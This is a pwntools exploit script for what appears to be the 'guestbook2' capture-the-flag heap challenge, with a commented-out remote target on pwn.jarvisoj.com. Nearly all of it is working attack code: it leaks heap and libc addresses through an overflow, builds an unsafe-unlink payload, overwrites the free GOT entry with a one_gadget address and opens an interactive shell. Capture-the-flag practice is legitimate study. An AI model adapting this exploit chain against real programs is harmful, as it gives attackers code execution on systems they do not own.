from pwn import *
import sys, os
context(
	log_level='info',
	binary='./guestbook2'
)
e=context.binary
libc=ELF('./libc.so.6')
# io=process()
# io=remote('pwn.jarvisoj.com',9879)
pwn_file="./libc.so.6 --library-path ./ ./guestbook2"
io = process(pwn_file.split())
# io = process(['./guestbook2'],env={"LD_PRELOAD":"./libc.so.6"})

#=========================================
#Function

def dbg(script=''):
	gdb.attach(io,gdbscript=script)

def menu(func):
	io.sendlineafter('Your choice: ',str(func))

def listBook():
	menu(1)

def add(size,content):
	menu(2)
	io.sendlineafter('Length of new post: ',str(size))
	io.sendafter('Enter your post: ',str(content))

def edit(index,size,content):
	menu(3)
	io.sendlineafter('Post number: ',str(index))
	io.sendlineafter('Length of post: ',str(size))
	io.sendlineafter('Enter your post: ',str(content))

def delete(index):
	menu(4)
	io.sendlineafter('Post number: ',str(index))


#=========================================
#VAR
leak_libc_off = 0x3c4b78
heap_off = 0x19d0
one_gadget=[283158,283242,983716,987463]
free_addr = e.got['free']
puts_addr = e.got['puts']
atoi_addr = e.got['atoi']
free_plt = e.plt['free']
puts_plt = e.plt['puts']
printf_plt = e.plt['printf']
success('free_addr: ' + hex(free_addr))
success('free_plt: ' + hex(free_addr))
success('puts_addr: ' + hex(puts_addr))
success('puts_addr: ' + hex(puts_addr))
success('atoi_addr: ' + hex(atoi_addr))

#=========================================
add(0x8,'a'*0x8) #0
add(0x8,'b'*0x8) #1
add(0x8,'c'*0x8) #2
add(0x8,'d'*0x8) #3
add(0x8,'e'*0x8) #4

delete(3)
delete(1)


edit(0,0x90,'A'*0x90)
listBook()
io.recvuntil('A'*0x90)
heap_leak = u64(io.recvuntil('\x0a')[:-1].ljust(8,'\x00'))
success("heap_leak: "+hex(heap_leak))
heap_base = heap_leak - heap_off
success("heap_base: "+hex(heap_base))


edit(0,0x98,'A'*0x98)
listBook()
io.recvuntil('A'*0x98)
libc_leak = u64(io.recvuntil('\x0a')[:-1].ljust(8,'\x00'))
success("libc_leak: "+hex(libc_leak))
libc_address = libc_leak -leak_libc_off
success("libc_address: "+hex(libc_address))
#=========================================

payload = p64(0)+p64(0x80)+p64(heap_base+0x30-0x18)+p64(heap_base+0x30-0x10)
payload = payload.ljust(0x80,'A')
payload += p64(0x80)+p64(0x90)
edit(0,len(payload),payload)
delete(1)


payload = p64(2) +p64(1) +p64(90) + p64(heap_base+0x30-0x18) + p64(1) +p64(0x8) + p64(heap_base+0x60)+p64(1) +p64(0x10)+p64(heap_base+0x1950)
payload = payload .ljust(0x90,'\x00')
# edit(0,0x90,'A'*0x90)
edit(0,0x90,payload)

edit(1,0x8,p64(free_addr))
edit(2,0x10,(p64(one_gadget[3]+libc_address)*2))

# dbg()

io.interactive()
